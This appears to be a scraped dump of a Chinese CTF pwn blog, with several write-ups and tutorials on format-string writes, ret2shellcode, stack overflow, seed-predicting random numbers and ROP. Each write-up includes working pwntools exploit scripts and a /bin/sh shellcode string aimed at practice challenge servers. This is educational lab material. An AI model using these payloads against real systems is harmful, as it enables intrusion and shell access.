此时我们将格式化字符放在payload的最后 12345678from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = p32(addr)+b&quot;%10$n&quot;io.sendline(payload)io.sendline(&quot;4&quot;)io.interactive() 由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4 我们接着再输入4，就成功破解了随机数 学会了？觉得很简单？再来看一个比较绕的exp 12345678from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = b&quot;AAAAAAA%13$n&quot;+p32(addr)io.sendline(payload)io.sendline(&quot;7&quot;)io.interactive() 这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了 看不懂没关系，接下来详解 我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数 那么我们要实现改写的是addr这个地址的随机数对吧 此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？ 很明显是12个字节，也就是三个字长 我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA 那么接下里的AAA%就会被写入11偏移 13$n就会被写入12偏移 而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13 似乎有点能理解了是吧？ 实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数 fmtstr_payload(offset, {addr: data}) offset就是我们需要更改内容的地址距离esp的偏移 addr就是我们需要改写内容的地址 data就是我们需要改写的数据 来看一下接下来的exp可以怎么写 123456789from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25117)io.recvuntil(&quot;your name:&quot;)payload=fmtstr_payload(10,&#123;0x804C044:1&#125;)io.sendline(payload)io.recvuntil(&quot;your passwd:&quot;)io.sendline(&quot;1&quot;)io.recv()io.interactive() 可以看到，我们就这样轻易的将addr处的随机数更改为了1 是不是比之前的两种payload构造办法简单许多？","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"Ret2shellcode","slug":"Ret2shellcode","date":"2022-09-21T08:37:21.000Z","updated":"2022-09-21T09:12:17.474Z","comments":true,"path":"2022/09/21/Ret2shellcode/","link":"","permalink":"http://example.com/2022/09/21/Ret2shellcode/","excerpt":"","text":"这次我们再来介绍一个栈的经典题型 在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？ 带着这个疑问，我们开始今天的学习 如何写入system（&#x2F;bin&#x2F;sh）？由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算 我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段 那么如何写入呢？ 我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh) 先前我们已经通过构造rop的方式用汇编语言指引执行流 这次我们尝试用机器码来将shellcode注入到内存中 常用的shellcode：”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个 当然还有第二种构造机器码的方式 shellcode &#x3D; asm(shellcraft.sh()) 但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行 我们还需要在后面加上amd64才能使其输出64位的机器码 当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码 例题解析这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解 老规矩看一下保护机制，NX开了，看来不能在栈上写入 ida看一下具体情况 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4[40]; // [rsp+0h] [rbp-30h] BYREF void *buf; // [rsp+28h] [rbp-8h] init(argc, argv, envp); buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;Hello my friend.Any gift for me?&quot;); read(0, buf, 0x100uLL); puts(&quot;Anything else?&quot;); read(0, v4, 0x100uLL); puts(&quot;Ok.See you!&quot;); return 0;&#125; 出现了个mmap函数，用来干什么的？ 可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000) 那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode 12345678910from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25533)shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;io.recvuntil(&quot;Hello my friend.Any gift for me?&quot;)io.sendline(shellcode)io.recvuntil(&quot;Anything else?&quot;)payload = cyclic(56)+p64(0x233000)io.sendline(payload)io.recv()io.interactive() 其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"pwn1_sctf_2016","slug":"pwn1-sctf-2016","date":"2022-09-19T12:00:48.000Z","updated":"2022-09-19T12:22:52.824Z","comments":true,"path":"2022/09/19/pwn1-sctf-2016/","link":"","permalink":"http://example.com/2022/09/19/pwn1-sctf-2016/","excerpt":"","text":"buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力) 老规矩了，checksec看一下保护机制和位数 感觉像是栈溢出，不确定，ida看看 哇，看到这函数列表懵逼了，不过别怕，仔细翻一番 逮到三个看名字有用的，f5看一下 main函数： 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vuln(); return 0;&#125; vuln函数： 1234567891011121314151617181920212223242526272829int vuln()&#123; const char *v0; // eax int v2; // [esp+4h] [ebp-54h] char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF char v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF char v5[7]; // [esp+40h] [ebp-18h] BYREF char v6; // [esp+47h] [ebp-11h] BYREF char v7[7]; // [esp+48h] [ebp-10h] BYREF char v8[5]; // [esp+4Fh] [ebp-9h] BYREF printf(&quot;Tell me something about yourself: &quot;); fgets(s, 32, edata); std::string::operator=(); std::allocator&lt;char&gt;::allocator(&amp;v6, s); std::string::string(v5, &quot;you&quot;, &amp;v6); std::allocator&lt;char&gt;::allocator(v8, v2); std::string::string(v7, &quot;I&quot;, v8); replace((std::string *)v4); std::string::operator=(&amp;input, v4, v7, v5); std::string::~string(v4); std::string::~string(v7); std::allocator&lt;char&gt;::~allocator(v8); std::string::~string(v5); std::allocator&lt;char&gt;::~allocator(&amp;v6); v0 = (const char *)std::string::c_str((std::string *)&amp;input); strcpy(s, v0); return printf(&quot;So, %s\\n&quot;, s);&#125; gatflag函数： 1234int get_flag()&#123; return system(&quot;cat flag.txt&quot;); 看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？ 百度完应该是c++中std::string相关的用法 不过这题应该是要我们会用debug来调试程序 我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩 浅写段exp，debug看看有什么玄机 123456from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)context.log_level = &quot;debug&quot; #这段就是打开debug，具体是什么，下面看到图你就知道了payload = b&#x27;I&#x27;*6io.sendline(payload)io.recv() 好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you 我们再来看看能不能进行栈溢出 可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？ 刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱） 那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了 exp: 123456from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)getflag_addr = 0x8048f0dpayload = b&#x27;I&#x27;*20+cyclic(4)+p32(getflag_addr)io.sendline(payload)io.recv()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"栈的基础知识2","slug":"栈的基础知识2","date":"2022-09-18T13:54:27.000Z","updated":"2022-09-25T07:38:54.952Z","comments":true,"path":"2022/09/18/栈的基础知识2/","link":"","permalink":"http://example.com/2022/09/18/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/","excerpt":"","text":"想了想还是专门列一个板块来详讲虚拟内存和栈的详细结构，刚好自己这块的了解也是一知半解的，顺便扫盲一下 cpu缓存从这个问题开始入手整个知识点体系吧 通常情况下，我们可以用cache的大小来区分一个cpu的性能 cache是什么？cache指的是cpu的三级缓存，L1，L2，L3 由于cpu的运算能力远远大于数据传输 所以cpu在接下来的操作会用到的数据就会存放到他自己的缓存中 防止产生传输速度跟不上运算速度的问题 L1缓存中采用的是静态随机访问存储器(RAM)，其还有一种动态RAM 二者区别在于，静态RAM集成度更低，体积更大，价格更为高昂，但是性能强于动态RAM L2和L32缓存便是采用动态RAM 并且 从L1到L3 三个缓存区的大小逐渐增大 但是仍然出现缓存区域不够的问题怎么办？扩大cache显然是最有效的办法，但是其成本过高 所以出现了内存条，即我们台式装机中所熟知的，内存条也一并归类于RAM 虚拟内存我们刚刚讲到，内存不够用时一般时扩大RAM，但是成本高，这里就出现了虚拟内存的用法 其本质是借用硬盘的一部分破碎的空间来使应用程序以为自己拥有了一块连续的内存地址 部分wiki过于学术，不好理解，这里摘取我个人觉得写的易懂有趣的一段描述 原文：虚拟内存详解 - 腾讯云开发者社区-腾讯云 (tencent.com) 这里我们了解一下，32位操作系统的电脑可以寻址到2^32(即寻址0~0xFFFFFFFF（4G）的地址空间) 但是假如你的电脑只有256m的物理内存(即0x~0x0FFFFFFF) 这时候虚拟内存映射到物理内存超出了物理内存地址的范围 那么这还如何调用？ 这里得引入页，页桢，页号等概念 我们首先得知道，虚拟内存分成各个相同大小的页，而物理内存也是分为和前者大小相同的页桢 这就意味着，虚拟内存页数量&gt;物理内存页桢 那么计算机是怎么处理这个问题的？ 页面失效（page fault）功能:他挑选出一个使用最少的页桢，把他放入硬盘，并且使页放入这个空位，修改其映射，使得每个页都有机会被调用到 我们这时候可以再说回计算机是如何寻址虚拟内存地址和物理内存地址的问题 我们仍然要提前了解偏移量和页号的概念 页号就是类似于铭牌，对应的映射到一个页桢 而偏移量就是页(页桢)的大小 这里比如操作系统想要访问一个页号为4的虚拟地址，他就会去该页号对应的页桢号(比如说是8)，如果页不在内存中，就利用页面失效功能，调入页，否则就把页帧号和偏移量传给MMU（CPU的内存管理单元）组成一个物理上真正存在的地址，接着就是访问物理内存中的数据了 MMU：分页内存管理单元,它是一种负责处理（CPU）的内存访问请求的计算机硬件。它的功能包括虚拟内存到物理内存地址的转化(即虚拟内存管理) 接下提一嘴，linux的内存地址空间是4gb，所以每个页的大小为1024*4&#x3D;4mb 转化为16进制则是0x1000 这里就是我们在计算基址偏移的时候，之所以每个函数的后三位都是固定的(同一个libc版本下) 因为同一libc版本下的函数偏移量都是固定的 由于基址的后三位恒为000，所以最终函数的真实地址的后三位也是固定的 内存分区内存一共分为五个区块 bss段 test段 stack段 heap段 data段 全局静态区(bss)：存储未被初始化的全局变量，和data段一样都属于静态分配(可以理解为一开始要多少就给多少)，在编译阶段就确定了大小，不释放 常量区(data): 存储已被初始化的全局变量、常量 **栈空间(stack)**：主要用于函数调用时存储临时变量的，这部分的内存是自动分配，自动释放的 堆空间(heap): 主要用于动态分配，C语言中malloc和free操作堆内存(栈的学习结束后，我们就将迎来堆) 代码区(text): 存储程序的二进制指令，即程序编译后的二进制代码 全局变量：未初始化即int a;初始化即int a &#x3D; 1; 我们先前讲到的栈，就是介于堆和栈中的一块空间","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"HUBUCTF-新生赛-fmt","slug":"HUBUCTF-新生赛-fmt","date":"2022-09-18T05:21:44.000Z","updated":"2022-09-18T11:00:52.652Z","comments":true,"path":"2022/09/18/HUBUCTF-新生赛-fmt/","link":"","permalink":"http://example.com/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/","excerpt":"","text":"老规矩走个流程，checksec看一下保护机制 好像看不出什么，猜不出他想干啥，拖到ida里面瞧瞧 123456789101112131415161718192021222324252627282930313233343536int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; FILE *stream; // [rsp+8h] [rbp-68h] char format[32]; // [rsp+10h] [rbp-60h] BYREF char s[8]; // [rsp+30h] [rbp-40h] BYREF __int64 v6; // [rsp+38h] [rbp-38h] __int64 v7; // [rsp+40h] [rbp-30h] __int64 v8; // [rsp+48h] [rbp-28h] __int64 v9; // [rsp+50h] [rbp-20h] __int64 v10; // [rsp+58h] [rbp-18h] __int16 v11; // [rsp+60h] [rbp-10h] unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); *(_QWORD *)s = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; v11 = 0; if ( stream ) fgets(s, 50, stream); HIBYTE(v11) = 0; while ( 1 ) &#123; puts(&quot;Echo as a service&quot;); gets(format); printf(format); putchar(10); &#125;&#125; 经典格式化字符串漏洞吧 把flag.txt的内容存储在变量s里面，这题得用到gdb了 教一个办法，像这种调用文件的，建议自己在本地建一个同名文件，方便查看文件在栈中的地址 可以看到我们自己在本机创建的flag.txt此时位于栈上的位置 AAAAAAAA就是我们在gets中输入的值 所以我们可以知道flag和格式化字符串的偏移是11(有可能会有差错，所以我的建议是等下泄露flag的时候扩大范围多试几个) 为什么是11？AAAAAAAA不是和flag只间隔了3个字长？这里是64位和32位栈传参的差异 64位和32位栈传参我在初期栈学习中，就一直注重强调32位和64位的不同，因为我本人在初期学习中，就常常对这二者没有足够的分辨意识 接下来着重讲解这二者的不同 首先是我们之前已经详细讲过的32位传参 具体的传参方式就是在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移也不同 我们在之前的阅读中，会注意到频繁出现的esp eip eax ebx等 这里的e就是32位特有，64位情况下的寄存器，通常是以r开头。例如rsp 64位传参的情况相较32位及其不同！！千万不要搞混 在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递 而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递 他们的共同点是，其第七个&#x2F;第五个参数就push入栈进行传递(因此上面的偏移值才是6+5[5是从AAAAAAAA开始数到flag]) 既然已经清楚了大致的偏移量，我们开始传入格式化字符串吧、 可以看到果然有些偏差，12才是正确的偏移量 这里又有一个问题了，为什么我们看到的是16进制形式的，而不是字符串形式 这就要从%x的用法着手分析了 x是打印出无0x的16进制 而我们换用%p试一下 转化成字符串看一下 17&#123;FTCSSN 倒过来，是不是像一个flag的格式了，说明这题就是用%p 这是为什么？%p和%x有什么区别？而且这里为什么又是倒转过来的？别急，慢慢讲 1.为什么这里要用%p%p是打印出所指栈位置中的地址指向的地方的内容 在搞懂这个问题前，我们得先知道，栈中是不会存储字符串的，这一点在栈溢出的时候就体现了出来 我们给system传参的时候是binsh字符串的地址，而不是binsh字符串 所以，看起来flag是存储到了栈中，其实只是他的地址被保存到了栈中 2.为什么是倒转过来的这里涉及到了小端序和大端序的问题 这二者都属于字节序，什么是字节序？为什么要有字节序？ 字节序指电脑内存中占用多个字节的数据的字节排列顺序 在几乎所有的平台上，多字节对象都被存储为连续的字节序列 为什么会有字节序，统一用大端序不行吗？答案是，计算机先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序。 那么什么是小端序和大端序？ 大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址 小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处 看不懂没关系，图文演示一下 上图为小端序的存储状况，作为高位字节的12就放在了低地址 而大端序的存储，就比较符合我们人类的阅读习惯 这里因为大端序我们接触的少，再加上小端序已经作了详细的解释，同理可得，就不进行作图了(真的不是我懒) 截止到现在，本题涉及到的知识点已经全部讲完了，如果想练练手的话，可以试试ctfshow中的pwn04(格式化字符串泄露canary)","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"HUBUCTF.新生赛.ez_pwn","slug":"HUBUCTF-新生赛-ez-pwn","date":"2022-09-17T14:27:18.000Z","updated":"2022-09-18T05:07:24.132Z","comments":true,"path":"2022/09/17/HUBUCTF-新生赛-ez-pwn/","link":"","permalink":"http://example.com/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/","excerpt":"","text":"ps:本题思路由youlin师傅指引 checksec一下，查看一下保护机制 保护全开 64位？有点被吓到了 不过这种题估计都是flag已经准备好了或者自带shellcode 拖进ida看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-8Ch] BYREF int i; // [rsp+8h] [rbp-88h] int v6; // [rsp+Ch] [rbp-84h] unsigned int seed[2]; // [rsp+10h] [rbp-80h] FILE *stream; // [rsp+18h] [rbp-78h] char v9[32]; // [rsp+20h] [rbp-70h] BYREF char s[8]; // [rsp+40h] [rbp-50h] BYREF __int64 v11; // [rsp+48h] [rbp-48h] __int64 v12; // [rsp+50h] [rbp-40h] __int64 v13; // [rsp+58h] [rbp-38h] __int64 v14; // [rsp+60h] [rbp-30h] __int64 v15; // [rsp+68h] [rbp-28h] __int64 v16; // [rsp+70h] [rbp-20h] __int64 v17; // [rsp+78h] [rbp-18h] unsigned __int64 v18; // [rsp+88h] [rbp-8h] v18 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); *(_QWORD *)seed = time(0LL); *(_QWORD *)s = 0LL; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; v17 = 0LL; puts(&quot;Who goes there?&quot;); gets(v9); printf(&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\\n&quot;, v9); srand(seed[0]); for ( i = 0; i &lt;= 99; ++i ) &#123; v6 = rand() % 100000 + 1; puts(&quot;I am thinking of a number from 1-100000. What is it?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v6 != v4 ) &#123; puts(&quot;You have failed. Goodbye.&quot;); return 0; &#125; puts(&quot;Impressive.&quot;); &#125; puts(&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( stream ) &#123; fgets(s, 50, stream); puts(s); &#125; puts(&quot;Goodbye.&quot;); return 0;&#125; 用时间做了种子，循环一百次，每次都随机一个数，我们需要输对这个数，算是经典的猜数字吧 一开始看到我们可以自定义赋值的v4和随机数v6是相邻的字节，所以想通过溢出来覆盖v6，使得if判断成立，不过貌似不行 所以还是正常做法吧 随机数，我目前知道的两种做法，一种是溢出数据覆盖seed，这样我们在知晓种子的值的情况下，因为c语言的rand是伪随机(下面就要降到了，我知道你很急，但你先别急)，所以就可以知道随机数的值 还有一种办法是本题将要使用到的，这道题我们可以发现他是用当前时间作为种子，来生成随机数，所以我们只要在exp中也是用当前时间作为种子，就可以得到一样的随机数（这里看不懂的话，是伪随机的概念不清楚） 1234567891011from pwn import *from ctypes import *io=remote(&quot;1.14.71.254&quot;,28056)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)seed = libc.time(0)libc.srand(seed)io.sendlineafter(b&#x27;Who goes there?&#x27;, b&#x27;chen&#x27;)for i in range(100): buf = libc.rand() % 100000 + 1 io.sendlineafter(b&#x27;What is it?&#x27;, str(buf)) io.recvuntil(b&#x27;\\n&#x27;) 几个疑点 1.cdll.LoadLibrary的用法：看了很多篇猜数字的题解啊，竟然没有一个人对这个函数用法有解释，那没办法了，只能自己wiki了 这个函数就是在python中重新加载文件库 还是有限制的：在64位的windows系统中，一个64位进程不能加载一个32位dll，同理一个32位进程也不能加载一个64位dll。 查资料的时候还看到这个限制的特殊情况，不过看不明白，估计了解的价值也不大，先丢在这，有空来填这个坑，感兴趣的可以自己先看(3条消息) python 调用 C++ dll 32位 64位 问题 ctypes.cdll.LoadLibrary_wowocpp的博客-CSDN博客_python调用32位dll 还有一种更深的用法是这个代码库将允许原生Linux程序从一个WindowsDLL文件中加载或调用功能函数 (3条消息) linux运行dll文件命令,LoadLibrary：一款能够允许Linux程序从DLL文件中加载或调用函数的工具…_七分醉玲珑的博客-CSDN博客 因为涉及到linux和windows的进程间通信和内核相关知识，我自己也还没有搞懂，留个坑吧，看以后有没有时间填上 2.伪随机这里介绍一下c语言中的伪随机 一些基础的c语言知识这里就不多解释了，比如说srand用法和种子的概念 先看看一段代码吧 123456789int main()&#123; for(int i=0; i&lt;10; i++) &#123; printf(&quot;%4d&quot;,rand()); &#125; printf(&quot;\\n&quot;); return 0;&#125; 输出10个随机数，我们两次运行试试 生成的随机数都一样？ 我们不妨这么理解，所谓的rand函数就是根据每个种子分配一张表格，所谓的随机数是从这个表格调用的，所以当我们第二次运行时，由于种子没改变，那么这张表格的数据也不会改变 那么我们如何获得真正意义上的随机数？想一下有什么东西的数据是一直在变化的 我们把目光瞄向时间，函数srand( (unsigned)time( NULL ) ) 中time返回的是1970年1月1日0点到现在时间流失的秒数值 因此，我们这下没法得知种子是多少，也就无法知道这个种子对应的随机数表是什么 但是我们重加载了libc库，同步获取了time返回的种子值，由于time是以秒作为单位的，我们每次for循环得出的随机数和题目的随机数几乎没有差距，所以这道题的随机数就呼之欲出了","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"ROP","slug":"ROP","date":"2022-09-17T01:26:39.000Z","updated":"2022-09-17T03:13:54.531Z","comments":true,"path":"2022/09/17/ROP/","link":"","permalink":"http://example.com/2022/09/17/ROP/","excerpt":"","text":"动态链接和静态链接静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过 我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用 不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份 静态库特点：1.静态库对函数库的链接是放在编译时期完成的2.程序在运行时与函数库再无瓜葛，移植方便。3.浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件4.如果静态库进行更新则应用该库的所有程序都需要重新编译（全量更新）。 动态库特点：1.动态库把对一些库函数的链接载入推迟到程序运行时期。2.可以实现进程之间的资源共享。（因此动态库也称为共享库）3.将一些程序升级变得简单。4.甚至可以真正做到链接载入完全由程序员在程序代码中控制（显示调用） 还是不太清楚？我们这样来理解，我们在吃饭前需要备好碗筷 如果我们每吃一道菜就要准备一副碗筷，这是静态库 如果我们只用一副碗筷就吃完所有菜，这是动态库 ROP在明白了动态库和静态库的区别后，我们接着讲栈溢出的相关内容 我们已经学过的栈溢出，需要函数中有着出题人给我们预先准备好的system函数和binsh字符串 如果没有呢？我们又该从何入手 在开始之前，我们先明白几个概念 1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。(涉及到接下来的栈变化情况，现在看不懂的没关系，接下来会图片演示详讲) 3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax 4.在linux系统中，函数的调用是有一个系统调用号的 我们接下来详细介绍这个系统调用号 系统调用号Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 而我们需要用到的system(&#x2F;bin&#x2F;sh)函数的系统调用号为11，也就是0xb 他的系统调用规范是execve(“&#x2F;bin&#x2F;sh”, 0,0) 那么我们如何向栈中传入这一串的数据来达到我们调用system的目的呢？ 计算机语言分为高级语言和低级语言 我们先要知道，像c语言，python语言这样的，是属于高级语言 高级语言指较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序 低级语言包括机器语言(二进制语言)和汇编语言 这两种语言都是面向机器的语言，和具体机器的指令系统密切相关 所以我们输入的是system(&#x2F;bin&#x2F;sh)，但是实际上计算机他不能读懂这段代码是什么意思 他要先进行编译，将其转化为自己能读懂的汇编语言 所以system(&#x2F;bin&#x2F;sh)用汇编语言来表示也可以转化为 12345pop eax 系统调用号载入， execve为0xbpop ebx 第一个参数， /bin/sh的stringpop ecx 第二个参数，0pop edx 第三个参数，0int 0x80 仔细思考一下，静态链接是将静态库在程序运行前就载入于文件中 所以，我们有了思路，既然静态链接导致的后果是文件过于庞大，因为其加载了静态库 所以我们可以在程序文件中搜索特定的汇编语言，将其一条条串连起来 这里我觉得有必要再插入一段说明，关于这个串连 我们是如何进行栈溢出的，实际上是覆盖ret addr来达到我们控制程序执行流的目的对吧 所以我们只需要确保每一个汇编代码执行完了以后都有一个ret指令，我们就可以使程序执行流按照我们预想的方式来跳转 那么我们又该如何寻找这些汇编代码呢？这里就用到了我们刚才提过的ropgadgets工具 ropgadgets我们在linux终端中输入 1ROPgadget -binary 文件名 --only&quot; 要搜索的 &quot; 于是，我们得到了 pop eax&#x2F;ebx 的地址 这里是是否还有一个疑问？欸他这里是连在一起的啊，就比如第一行pop eax和pop ebx是连在一起的怎么办？ 很简单，我们只需要同时传入他们各自所需要的参数即可 我们再搜索ebx.ecx.edx 以及int 80h系统调用和bin&#x2F;sh 到这里为止，我们就清楚了rop构造执行流的完整思路，接下来我们用一道例题来演示 ret2syscall我们先用checksec检查他开启了哪些保护机制以及查看他的位数 打开了NX保护机制，我们无法在栈中读写数据，所以只能采用构造ROP执行流的办法 再用ida打开看一下main函数写了什么 可以看到gets函数，判断应该也是一个栈溢出题 但是没有给我们提供system函数地址和字符串binsh地址 所以我们这里利用ROP构造 我们来查找pop eax等汇编代码的地址 得到了地址之后，我们开始构造payload","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"基础知识1","slug":"基础知识1","date":"2022-09-16T04:46:22.000Z","updated":"2022-11-18T14:59:20.306Z","comments":true,"path":"2022/09/16/基础知识1/","link":"","permalink":"http://example.com/2022/09/16/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861/","excerpt":"","text":"本文用于简单介绍部分基础知识，详细请自行了解 并且为最初版的缘故，彼此之间并没有递进的关系，属于是我什么时候学到了就塞进来，所以此篇在学习时可以跳过，偶尔进来看看扩展知识点 缓冲区缓冲区又称为缓存，它是内存空间的一部分。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。 缓冲区的作用是什么？我们为什么不能直接进行硬盘和计算机之间的交互？ 当我们在从硬盘中读入数据时，我们先把硬盘中的数据放入缓冲区，计算机再去缓冲区中读取数据，缓冲区中的数据被读取完了以后，缓冲区再去硬盘中读取数据 这样可以减少硬盘的读取次数，提高使用寿命 再加上计算机在缓冲区中的读取速度远远大于读取硬盘中的数据，运行效率也得到提升 做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是 你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程 而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面 虚拟机虚拟机通过软件模拟的具有完整功能的，能够运行在一个与物理机或和其他虚拟机环境隔绝的计算机系统 在物理机中能实现的系统操作在虚拟机中都能够实现 虚拟机的硬盘和内存容量需要从物理机中借用一部分 常常用来搭建linux操作系统 c语言文件描述符Linux 中一切都可以看作文件，包括普通文件、链接文件、Socket 以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有 I&#x2F;O 操作相关的系统调用都需要通过文件描述符。 我们可以通过open函数系统调用得到一个指向该文件的描述符 这里我懒，借用文件描述符了解一下 - 知乎 (zhihu.com)的实验数据，感兴趣的可以自己看 我们会发现文件描述符是一个非0正数 标准输入：0 标准输出：1 标准错误：2 这三个文件描述符默认情况下是开启的 文件描述符遵守着这样一个原则(非专业性原则，别盲目信服，有错误欢迎指出) open函数总是返回最低的未打开的描述符 此时如果我们open一个文件，这个文件的文件描述符就是3 说了这么多，我们拿一题例题来直观感受 13行的close函数关闭了文件描述符1(标准输出) 而后又打开了文件flag.txt，此时flag.txt对应的文件描述符本应该是3 但是由于此时1被关闭了，多出了一个空余，根据原则，将优先返回最小的文件描述符，所以此时flag.txt对应的文件描述符就应该是1 read和write的用法这里不做解释了，适当培养自主查找资料并且理解的能力 直接调用call system和system的区别我们在构造payload时，有时会遇到溢出长度不够的情况 例如这题中(32位)，读入的数据长度为40个字节，而v1距离ebp28个字节，这里存在栈溢出 但是当我们想构造payload时我们会发现，按照正常的调用system时 payload &#x3D; cyclic(28)+cyclic(4)+p32(system_addr)+p32(0xabcdabc)+p32(binsh_addr) 